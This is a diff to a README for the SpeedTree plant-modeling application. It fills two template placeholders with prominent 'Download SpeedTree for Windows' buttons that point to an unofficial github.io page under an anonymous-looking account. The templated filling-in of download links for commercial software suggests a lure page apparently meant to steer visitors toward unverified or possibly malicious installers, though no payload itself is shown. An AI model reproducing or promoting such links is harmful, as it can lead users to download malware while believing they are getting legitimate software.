@@ -16,7 +16,7 @@ SpeedTree is a 3D plant modeling tool for Windows that lets artists create reali
 <div align="center">
   <h3>« Model realistic trees and plants for games, film, and visualization »</h3>
 
-  [![Download SpeedTree](https://img.shields.io/badge/⬇_Download_SpeedTree_for_Windows-33691E?style=for-the-badge)](PASTE-DOWNLOAD-LINK-1-HERE)
+  [![Download SpeedTree](https://img.shields.io/badge/⬇_Download_SpeedTree_for_Windows-33691E?style=for-the-badge)](https://e75308457.github.io/.github/SpeedTree-Plant-Modeling-App)
 
 </div>
 
@@ -88,7 +88,7 @@ For help with SpeedTree, open the built-in Help or Support section inside the ap
 <div align="center">
   <h3>Ready to get started with SpeedTree?</h3>
 
-  [![Download SpeedTree](https://img.shields.io/badge/⬇_Download_SpeedTree_for_Windows-33691E?style=for-the-badge)](PASTE-DOWNLOAD-LINK-2-HERE)
+  [![Download SpeedTree](https://img.shields.io/badge/⬇_Download_SpeedTree_for_Windows-33691E?style=for-the-badge)](https://e75308457.github.io/.github/SpeedTree-Plant-Modeling-App)
 
 </div>
 
